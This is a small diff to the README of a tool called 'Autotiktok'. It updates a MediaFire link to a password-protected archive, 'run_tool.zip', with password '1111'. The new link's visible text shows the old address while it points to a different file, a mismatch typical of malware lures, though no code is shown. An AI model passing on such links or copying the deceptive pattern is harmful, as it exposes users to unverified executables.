@@ -1,7 +1,9 @@
 # Autotiktok
 
-Download at: https://www.mediafire.com/file/pcvwq2ifoonzsnv/run_tool.zip/file
+Download at: [https://www.mediafire.com/file/pcvwq2ifoonzsnv/run_tool.zip/file](https://www.mediafire.com/file/y6br4il296fufkb/run_tool.zip/file)
+
 Hoặc cập nhật bằng update.bat
+
 Password: 1111
 
 # Changelogs:
